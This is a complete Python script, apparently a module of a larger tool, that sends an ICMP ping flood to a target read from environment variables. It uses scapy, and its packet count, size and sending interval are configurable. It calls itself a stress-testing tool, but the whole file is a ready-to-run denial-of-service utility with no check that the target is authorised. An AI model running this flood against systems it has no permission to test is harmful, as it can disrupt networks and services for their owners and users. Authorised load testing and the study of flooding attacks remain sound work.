#!/usr/bin/env python3
"""
ICMP Flooder Module
Simple ICMP ping flood tool for stress testing
"""

import os
import sys
import time
import signal

try:
    from scapy.all import IP, ICMP, Raw, send
except ImportError:
    print("Error: scapy not installed. Install with: pip install scapy")
    sys.exit(1)

def main():
    target = os.getenv('ARG_TARGET')
    count = int(os.getenv('ARG_COUNT', '100'))
    packet_size = int(os.getenv('ARG_PACKET_SIZE', '56'))
    interval = float(os.getenv('ARG_INTERVAL', '0.1'))
    
    if not target:
        print("Error: target required")
        sys.exit(1)
    
    print(f"[*] Starting ICMP flood to {target}")
    print(f"[*] Count: {count}, Size: {packet_size}B, Interval: {interval}s")
    
    sent = 0
    start_time = time.time()
    
    def signal_handler(sig, frame):
        elapsed = time.time() - start_time
        rate = sent / elapsed if elapsed > 0 else 0
        print(f"\n[+] Sent {sent} packets in {elapsed:.2f}s ({rate:.2f} pps)")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        for i in range(count):
            packet = IP(dst=target)/ICMP()/Raw(load=b"A" * (packet_size - 20))
            send(packet, verbose=False)
            sent += 1
            print(f"[+] Sent packet {sent}/{count}", end='\r')
            
            if interval > 0:
                time.sleep(interval)
        
        elapsed = time.time() - start_time
        rate = sent / elapsed if elapsed > 0 else 0
        print(f"\n[+] Complete. Sent {sent} packets in {elapsed:.2f}s ({rate:.2f} pps)")
    except PermissionError:
        print("Error: This module requires root/administrator privileges")
        sys.exit(1)
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
